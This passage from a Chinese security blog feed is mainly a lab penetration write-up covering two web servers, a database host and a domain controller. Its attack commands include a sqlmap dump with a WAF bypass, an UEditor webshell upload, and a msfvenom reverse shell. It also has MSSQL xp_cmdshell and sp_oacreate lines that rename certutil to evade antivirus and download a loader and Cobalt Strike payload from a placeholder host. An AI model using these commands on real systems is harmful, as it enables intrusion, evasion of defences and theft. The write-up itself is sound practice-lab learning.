<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AdminInterceptor</span> <span class="kd">implements</span> <span class="nc">HandlerInterceptor</span> <span class="o">{</span>
    <span class="nd">@Autowired</span>
    <span class="kd">private</span> <span class="nc">UserServices</span> <span class="n">userServices</span><span class="o">;</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">o</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">url</span> <span class="o">=</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getRequestURI</span><span class="o">();</span>
        <span class="nc">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getSession</span><span class="o">();</span>
        <span class="k">if</span><span class="o">(</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/admin"</span><span class="o">)){</span>
            <span class="k">if</span><span class="o">(!</span><span class="n">userServices</span><span class="o">.</span><span class="na">isAdmin</span><span class="o">((</span><span class="nc">User</span><span class="o">)</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">))){</span>
                <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">o</span><span class="o">,</span> <span class="nc">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">o</span><span class="o">,</span> <span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>判断请求路由是否为<code class="language-plaintext highlighter-rouge">/admin</code>开头，是则从session中判断是否为admin用户。</p>

<p>不过tomcat下使用url解析特性可以进行绕过：</p>

<ul>
  <li><a href="https://xz.aliyun.com/t/10799#toc-7">tomcat容器url解析特性研究</a></li>
</ul>

<h2 id="0x07-参考">0x07 参考</h2>

<ul>
  <li><a href="https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/mvc.html">Web MVC framework</a></li>
  <li><a href="http://c.biancheng.net/spring_mvc/process.html">Spring MVC执行流程 </a></li>
</ul>]]></content><author><name>Theoyu</name></author><category term="JAVA" /><summary type="html"><![CDATA[接触java以来web相关的东西都是springboot开箱即用，基本上没有配置过springMVC，打算还是从0到1接触接触。]]></summary></entry><entry><title type="html">记一次和室友曲折的靶场实战</title><link href="https://theoyu.top/2022/ack123" rel="alternate" type="text/html" title="记一次和室友曲折的靶场实战" /><published>2022-03-28T00:00:00+08:00</published><updated>2022-03-28T00:00:00+08:00</updated><id>https://theoyu.top/2022/ack123</id><content type="html" xml:base="https://theoyu.top/2022/ack123"><![CDATA[<!--more-->

<h2 id="0x00-前言">0x00 前言</h2>

<p>开局豪言壮语：“两天必拿下！”；前期自言自语：“为啥这也能被杀啊？”；中期胡言乱语：“行了行了今天就这样吧”；后期沉默不语…</p>

<p>模拟真实环境，我把Web1通过frp转发给了VPS，修改本地hosts即可访问Web服务，总的来说这一套靶场打下来还算畅快～也见识到了自己各个方面的不足，这里简单做一个记录 （只记录可能有用的环节，一些白忙活的试错已抹去…），域内的部分大多是室友（后文用『马哥』代替）负责，我就不过多介绍了～</p>

<h2 id="0x01-web1">0x01 Web1</h2>

<p>访问<code class="language-plaintext highlighter-rouge">www.ackmoon.com</code>:</p>

<p>发现我还在配域环境的时候，马哥已经拿到了一个xss…</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105741.png" alt="image-20220330090254442" /></p>

<p>目录扫描，扫到了<code class="language-plaintext highlighter-rouge">/login</code>路由，登录显示存在admin用户，随意创建一个用户进后台发现可以是可以直接修改前台模版(html)，但是进一步操作需要管理员权限。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105748.png" alt="image-20220330090936005" /></p>

<p>查看网站配置，发现使用了MSSQL和百度Ueditor，隐隐约约记得1.4.3这个版本是有洞的，不过上网查了一下漏洞利用需要一个富文本编辑器的接口，普通用户是看不到的。</p>

<p><del>种种迹象表明，应该需要拿到管理员权限才能更进一步。</del></p>

<p>网站首页查询界面存在sql注入</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105751.png" alt="image-20220324170705114" /></p>

<p>不过发现注入速度非常慢，大概10多秒钟才能回显一个字母。</p>

<p>一般这种xxxcms的建站，在网上都可以搜到相关源码，而数据库相关信息都是写死在源码中的，我们需要拿到管理员密码，那么只需要找到密码在数据库中所在的表和列即可。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105754.png" alt="image-20220330090053912" /></p>

<p>在源码的<code class="language-plaintext highlighter-rouge">HdhApp.cinfig</code>中找到了数据库文件<code class="language-plaintext highlighter-rouge">HdbCms.mdb</code>，可用微软自带的Access打开：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660" /></p>

<p>经测试网站存在WAF，不过可用大小写绕过，这里选择sqlmap的<code class="language-plaintext highlighter-rouge">randomcase</code>模式：</p>

<p><code class="language-plaintext highlighter-rouge">python3 sqlmap.py -r "~/sql.txt" -p DonforGjc -D "DemoHdhCms" -T "Onkey_DonforGlcy" -C "pwd" --tamper=randomcase --dump </code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105759.png" alt="image-20220324174403445" /></p>

<p>拿到了管理员密码，不过我继续看了一下源码，抱着好奇的心态全局搜索了一下<code class="language-plaintext highlighter-rouge">UEditor</code>，居然搜到了其对应的借口，用<code class="language-plaintext highlighter-rouge">admin,password-moon</code>登录上去确实的确是这个。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105802.png" alt="image-20220330090143924" /></p>

<p>麻了感觉白注入，不过关系不大，那就直接打<code class="language-plaintext highlighter-rouge">UEditor</code>吧。</p>

<p>写一个aspx一句话，改名为 <code class="language-plaintext highlighter-rouge">theoyu.jpg</code>，放在vps上并开启http服务。</p>

<p>本地创建一个html文件：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage"</span><span class="na">enctype=</span><span class="s">"application/x-www-form-urlencoded"</span>  <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>   <span class="nt">&lt;p&gt;</span>shell addr:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"source[]"</span> <span class="nt">/&gt;&lt;/p</span> <span class="nt">&gt;</span>   <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<p>浏览器打开后输入<code class="language-plaintext highlighter-rouge">http://your_ip/theoyu.jpg?.aspx</code>，利用解析漏洞上传上去(被保存为了aspx文件)</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105806.png" alt="image-20220324184727113" /></p>

<p>webshell上线之后，蚁剑连接，看看杀软：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105811.png" alt="image-20220325141017282" /></p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">进程名称</th>
      <th style="text-align: left">识别结果</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">ZhuDongFangYu.exe</td>
      <td style="text-align: left">360安全卫士-主动防御</td>
    </tr>
    <tr>
      <td style="text-align: left">360sd.exe</td>
      <td style="text-align: left">360杀毒</td>
    </tr>
    <tr>
      <td style="text-align: left">hws.exe</td>
      <td style="text-align: left">护卫神</td>
    </tr>
  </tbody>
</table>

<p>之后马哥就进入了漫长的免杀环节…</p>

<p>想起来之前下载源码的 <strong>HdhApp.config</strong> 文件是会记录数据库机器的信息的，留意了一下再看看：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105815.png" alt="image-20220325100258375" /></p>

<p>发现<code class="language-plaintext highlighter-rouge">source</code>指向并非官方源码上的localhost，而是22网段的一个ip，怀疑存在站库分离。</p>

<h2 id="0x02-data1">0x02 data1</h2>

<p>信息收集了一下也的确存在22网段和这个ip，mssql默认端口号为1433，这里我使用哥斯拉自带数据库管理进行连接。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105818.png" alt="image-20220325141502201" /></p>

<p>连上之后，可以命令执行，但是很不方便(回显都在一张表里..)，whoami看到还是一个很低的权限用户，需要cs或者msf后渗透才行。</p>

<p>可是msf在本地，接收不到web1的shell，决定用frpb把本地msf监听端口映射到公网。</p>

<pre><code class="language-txt">[common]
server_addr = your ip
server_port = 7001

[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 2333
</code></pre>

<p>这样反弹在公网2333端口的流量，就会转发给本地4444端口。</p>

<p>另外web1虽然是x64，但是x64的payload一直没反应，换x86的反而好了。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom  -p windows/meterpreter/reverse_tcp LHOST=your ip LPORT=2333 -f aspx &gt;~/theoyu.aspx
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp 
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 127.0.0.1
LHOST <span class="o">=&gt;</span> 127.0.0.1
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT  4444 
LPORT <span class="o">=&gt;</span> 4444
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 127.0.0.1:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175174 bytes<span class="o">)</span> to 127.0.0.1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 11 opened <span class="o">(</span>127.0.0.1:4444 -&gt; 127.0.0.1:63692 <span class="o">)</span> at 2022-03-25 14:38:21 +0800

meterpreter <span class="o">&gt;</span> 
</code></pre></div></div>

<p>个人使用cs多一些，所以决定派生给Cobalt Strike。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> background 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Backgrounding session 14...
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> use exploit/windows/local/payload_inject
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span>  <span class="nb">set </span>LHOST your_ip
LHOST <span class="o">=&gt;</span> your_ip
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 7777
LPORT <span class="o">=&gt;</span> 7777
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>disablepayloadhandler <span class="nb">true
</span>disablepayloadhandler <span class="o">=&gt;</span> <span class="nb">true
</span>msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 14
session <span class="o">=&gt;</span> 14
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> run
</code></pre></div></div>

<p>cs接收后，是用烂土豆可以直接提权到System。（马哥放弃了免杀，选择加入）</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105822.png" alt="image-20220325160102079" /></p>

<p>本来打算用cs自带的代理，用proxychain配合<a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a>直接打数据库，但是m1的proxychain配了一下午也没配好，蚌埠住了，直接上网找了个自带数据库管理的大马。<del>上面纯纯白忙活。</del>（其实也不算白忙活，在exe被直接杀的情况下，也的确可以用这种方式回弹cs）</p>

<p>命令执行后，查一下进程，有火绒。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105828.png" alt="image-20220326104435675" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105835.png" alt="image-20220326011713900" /></p>

<p>回到web1，之前马哥在web1被360杀疯了，在他的请求下我看了眼虚拟机是啥情况：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105832.jpg" alt="E3B51E067B2366D67635BC9838C3B0C2" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105839.jpg" alt="40C990A590B7A5066AF38F27984D7FCC" /></p>

<p>我理解这是两类防御，第一种是木马查杀，也就是直接传可执行文件，没做免杀或者免杀力度不够上来就没了。第二类是加载器+注入内存，不过此类可能会被入侵检测检测到。</p>

<p>上网查了一下，火绒应该只针对前者还有本地的异常命令进行检测，所以可以利用<code class="language-plaintext highlighter-rouge">certutil</code>从vps上远程下载loader和row文件。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exec master.dbo.xp_cmdshell ' certutil –urlcache –f –split http://your ip/HanzoInjection.exe C:\Windows\Temp\loader.exe'
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105959.png" alt="image-20220326114039661" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105846.png" alt="image-20220326113519456" /></p>

<p>发现vps收到了访问请求，但是并没能下载成功，查了一下是火绒对本地<code class="language-plaintext highlighter-rouge">certutil</code>有所限制，可以 把system32下的<code class="language-plaintext highlighter-rouge">certutil</code>移位置重命名绕过检测。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec sp_configure 'show advanced options', 1;  RECONFIGURE;  exec sp_configure 'Ole Automation Procedures', 1;  RECONFIGURE;


利用sp_oacreate构造语句，将certutil.exe复制到c:\windows\temp\下，并重命名为sethc.exe：
declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\certutil.exe' ,'c:\windows\temp\sethc.exe';

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://your_ip:20022/HanzoInjection.exe" C:\Users\MSSQLSERVER\loader.exe'

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://your ip/cs.bin" C:\Users\MSSQLSERVER\cs.bin'

Exec master.dbo.xp_cmdshell 'cd C:\Users\MSSQLSERVER\ &amp;&amp; loader.exe -e cs.bin'

</code></pre></div></div>

<p>cs接收后，同web1烂土豆提权。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105849.png" alt="image-20220326125847785" /></p>

<p>信息收集，马哥发现22网段下135存活，建立cs自带的socks代理，马哥继续nmap扫描</p>

<pre><code class="language-txt">Nmap scan report for 192.168.22.135
Host is up (1.4s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE            VERSION
25/tcp    open  smtp?
80/tcp    open  http               Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
110/tcp   open  pop3?
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql              MySQL (unauthorized)
3389/tcp  open  ssl/ms-wbt-server?
4444/tcp  open  krb524?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
</code></pre>

<p>80端口下是个Apache服务，进入Web2。</p>

<h2 id="0x03-web2">0x03 Web2</h2>

<p>192.168.22.135的80端口开启了Apache服务，通过代理访问，是一个 <strong>演示：J WT实战：使用axios+PHP</strong> 实现登录认证页面，用给的demo账号登录没有反应，这里马哥去爆破jwt密钥了。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105853.png" alt="image-20220326141009298" /></p>

<p>继续信息收集，扫到目录下<code class="language-plaintext highlighter-rouge">a.php</code>，前面是一堆sql日志信息，后面打印了<code class="language-plaintext highlighter-rouge">phpinfo</code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110009.png" alt="image-20220326162954201" /></p>

<p>发现<code class="language-plaintext highlighter-rouge">PHP_SESSION_UPLOAD_PROGRESS</code>是开启的，那么如果存在文件包含是可能可以直接LFI Getshell(说是有可能是因为用代理打的话，不太稳定)。</p>

<p>但是走到<code class="language-plaintext highlighter-rouge">a.php</code>最后，我直接蚌埠住了，什么意思？</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105859.png" alt="image-20220326162254713" /></p>

<p>这不就是典型的一句话木马没传参数的报错嘛，给蚁剑设上代理，连接试试</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105902.png" alt="image-20220326162618818" /></p>

<p>成功了，有点没弄懂，那jwt页面岂不是完全唬人嘛，马哥的爆破也白弄了，不过如果是真实环境下，倒是也都有可能，前进都是在不断试错的基础上迈步。</p>

<p>蚁剑连上去，发现<code class="language-plaintext highlighter-rouge">phpmyadmin</code>，以及几个文件的创建时间，结合之前<code class="language-plaintext highlighter-rouge">a.php</code>上sql日志信息，大概明白应该是利用jwt爆破的密钥登录phpmyadmin，再利用日志文件getshell。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105905.png" alt="image-20220326164915760" /></p>

<p>马哥jwt也爆破出来了</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110028.png" alt="image-20220326163351362" /></p>

<p>简单测试了一下，用root Qweasdzxc5 登录phpmyadmin成功 ，之后就是很简单的日志写马，就不演示了。</p>

<p>但是Web2并不出网，这里我们通过Web1做跳板机代理出来。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105909.png" alt="image-20220326175722454" /></p>

<p>payload生成选择<strong>Windows Excutable(s)</strong>，再用蚁剑上传上去，执行拿到权限。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105912.png" alt="image-20220326180431551" /></p>

<p>但是session极其不稳定，平均一分钟一跳，很难受：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110043.png" alt="image-20220326182548376" /></p>

<p>看网上说用ew做跳板工具会比cs自带的转发稳定一些，不过在web1基本上上去就被杀了。之前Kcon关注到<a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a>这个项目还不错，有机会可以学习一下。</p>

<h2 id="0x04-dcdata2">0x04 DC+data2</h2>

<p>发现Web2在域内，看一下域内机器：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105916.png" alt="image-20220326195802401" /></p>

<p>出去上了个课，回来马哥已经拿下了域控(别骂了别骂了有机会我补上)，这里我横向建立 SMB Beacon，域内就可以批量上线了～</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105919.png" alt="image-20220329003822748" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105922.png" alt="image-20220329004044722" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105926.png" alt="image-20220329003540577" /></p>

<p>最后：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105930.png" alt="image-20220329003649048" /></p>

<p>总结</p>

<ol>
  <li>mac极其不方便，很多免杀工具都依赖于winAPI，直接G。</li>
  <li>在未知的环境下，需要清楚自己当前的目标是什么，不然很容易在无意义的事情上浪费时间。</li>
  <li>有机会可以学学多级代理、端口复用，自己写点东西。</li>
  <li>内网还挺有意思，虽然我只是Script Kid。</li>
</ol>]]></content><author><name>Theoyu</name></author><summary type="html"><![CDATA[]]></summary></entry></feed>